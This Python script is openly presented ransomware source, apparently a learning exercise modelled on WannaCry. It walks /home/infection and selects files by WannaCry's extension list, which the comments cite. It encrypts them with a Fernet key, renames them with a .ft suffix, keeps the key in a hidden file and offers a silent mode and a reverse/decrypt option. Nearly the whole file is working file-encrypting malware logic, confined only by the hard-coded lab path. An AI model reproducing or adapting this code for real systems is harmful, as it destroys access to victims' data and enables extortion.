#!/usr/bin/env python3

from cryptography.fernet import Fernet
import os, pathlib, sys
vers = "1.0.0"
silent = 0
#Function to print things with color :)

def printcolor(string, color, mode):
    if (mode == 0):
        if (color == "red"):
            print("\033[1;31;40m" + string + "\033[0;37;40m")
        if (color == "yellow"):
            print("\033[1;33;40m" + string + "\033[0;37;40m")
    return

#Function that helps the stupid user

def sos():
    printcolor("\nUsage:\n", "yellow", silent)
    printcolor("\n" + sys.argv[0] + ":				Encrypts all the files in /home/infection directory and generates a key\n", "yellow", silent)
    printcolor("\n" + sys.argv[0] + " -help (-h):				Shows you some help\n", "yellow", silent)
    printcolor("\n" + sys.argv[0] + " -version (-v):				Shows the current version of the program\n", "yellow", silent)
    printcolor("\n" + sys.argv[0] + " -reverse (-r) key:        In case you encrypted some files, this will undo the encryption(key needs to exist)\n", "yellow", silent)
    printcolor("\n" + sys.argv[0] + " -silent (-s):        The program wont show any output (specify at the end of the command)\n", "yellow", silent)
    exit()


def version():
    printcolor("\nThe current version is " + vers + "\n", "yellow", silent)
    exit()


def reverse():
    pathi = "/home/infection"
    laughfiles = []
    if (os.path.isfile(pathi) == True or os.path.isdir(pathi) == False):
        printcolor("\n" + pathi + " is not a directory or the directory doesnt exist. There is nothing to encrypt\n", "yellow", silent)
        exit()
    if not os.listdir(pathi):
        printcolor("\nThe directory " + pathi + " is empty. There is nothing to encrypt\n", "yellow", silent)
        exit()

    for path, dirs, files in os.walk(pathi):
        for name in files:
            if pathlib.Path(os.path.join(path, name)).suffix == ".ft":
                laughfiles.append(os.path.join(path, name))
    if (not laughfiles):
        printcolor("\n\nDecryption has failed. No encrypted files were found\n", "yellow", silent)
        exit()
    decrypted_files = []

    for file in laughfiles:
        try:
            with open(file, "rb") as thefile:
                contents_encrypted = thefile.read()
            if (not contents_encrypted):
                printcolor(file + " is empty. Skipping to next file", "red", silent)
                continue
            contents = Fernet(sys.argv[2]).decrypt(contents_encrypted)
            if (pathlib.Path(os.path.join(file)).suffix == ".ft"):
                with open(file, "wb") as thefile:
                    thefile.write(contents)
                decrypted_files.append(file)
                printcolor(file + " has been decrypted", "yellow", silent)
                os.rename(file, str(file).replace(".ft", ""))
        except:
            printcolor(file + " couldnt be decrypted", "red", silent)
    if (not decrypted_files):
        printcolor("\n\nDecryption has failed. No files were decrypted\n", "red", silent)
        exit()
    printcolor("\n\nEncryption has been completed\n", "yellow", silent)
    exit()
#The extensions affected by Wannacry, which we will affect as well

exts = ['.der','.pfx','.crt','.csr','.p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
    '.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'
    ,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'
    ,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'
    ,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'
    ,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'
    ,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'
    ,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
    ,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
    ,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
    ,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
    ,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']

#In case there's an error in the arguments

for s in sys.argv:
    if (s == "-silent" or s == "-s"):
        silent = 1
if (len(sys.argv) > 4):
    printcolor("\nToo many arguments. See " + sys.argv[0] + " -h for help\n", "yellow", silent)
    exit()

elif (len(sys.argv) == 2):
    if (not (sys.argv[1] == "-help" or sys.argv[1] == "-h" or sys.argv[1] == "-version" or sys.argv[1] == "-v" or sys.argv[1] == "-reverse" or sys.argv[1] == "-r" or sys.argv[1] == "-silent" or sys.argv[1] == "-s")):
        printcolor("\nThe option " + sys.argv[1] + " is not available. See -h for help\n", "yellow", silent)
        exit()
    elif (sys.argv[1] == "-reverse" or sys.argv[1] == "-r"):
        printcolor("\nThe option " + sys.argv[1] + " needs one more argument, the key. See -h for help\n", "yellow", silent)
        exit()
    elif ((sys.argv[1] == "-silent" or sys.argv[1] == "-s")):
        silent = 1
elif (len(sys.argv) > 2):
    if (not (sys.argv[1] == "-reverse" or sys.argv[1] == "-r")):
        printcolor("\nThe option " + sys.argv[1] + " is not available. See -h for help\n", "yellow", silent)
        exit()
    if (not os.path.isfile(".not_the_key.key")):
        printcolor("\nYou didnt create any key yet. See -h for help\n", "yellow", silent)
        exit()
    keyfile = open(".not_the_key.key")
    keykey = keyfile.read()
    if (keykey != sys.argv[2]):
        printcolor("\nYour key does not match with the key used to encrypt the files. See -h for help\n", "yellow", silent)
        exit()



#Cool as fuck header

header = open("header.stock")
header_cont = header.read()
printcolor(header_cont, "red", silent)



#In case there is any option


if (len(sys.argv) == 2):
    if (sys.argv[1] == "-help" or sys.argv[1] == "-h"):
        sos()
    elif (sys.argv[1] == "-version" or sys.argv[1] == "-v"):
        version()
    elif (sys.argv[1] == "-silent" or sys.argv[1] == "-s"):
        silent = 1
elif (len(sys.argv) > 2):
    if(sys.argv[1] == "-reverse" or sys.argv[1] == "-r"):
        reverse()


#In case no option is selected, we will just encrypt the files we find


pathi = "/home/infection"
cryfiles = []
if (os.path.isfile(pathi) == True or os.path.isdir(pathi) == False):
    printcolor("\n" + pathi + " is not a directory or the directory doesnt exist. There is nothing to encrypt\n", "yellow", silent)
    exit()
if not os.listdir(pathi):
    printcolor("\nThe directory " + pathi + " is empty. There is nothing to encrypt\n", "yellow", silent)
    exit()

for path, dirs, files in os.walk(pathi):
    for name in files:
        if pathlib.Path(os.path.join(path, name)).suffix in exts:
            cryfiles.append(os.path.join(path, name))

if (not cryfiles):
    printcolor("\n\nNo files to encrypt were detected\n", "red", silent)
    exit()
key = Fernet.generate_key()

contentfiles = []
for file in cryfiles:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        if (contents):
            contentfiles.append(contents)
    except:
        continue
if (not contentfiles):
    printcolor("The files you can encrypt are empty. There is nothing to encrypt", "red", silent)
    exit()
with open(".not_the_key.key", "wb") as thekey:
    thekey.write(key)

encrypted_files = []

for file in cryfiles:
    try:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        if (not contents):
            printcolor(file + " is empty. Skipping to next file", "red", silent)
            continue
        contents_encrypted = Fernet(key).encrypt(contents)
        if (pathlib.Path(os.path.join(file)).suffix != ".ft"):
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
            encrypted_files.append(file)
            printcolor(file + " has been encrypted", "yellow", silent)
            os.rename(file, file + ".ft")
    except:
        printcolor(file + " couldnt be encrypted", "red", silent)
if (not encrypted_files):
    printcolor("\n\nEncryption has failed. No files were encrypted\n", "red", silent)
    exit()
printcolor("\n\nEncryption has been completed\n", "yellow", silent)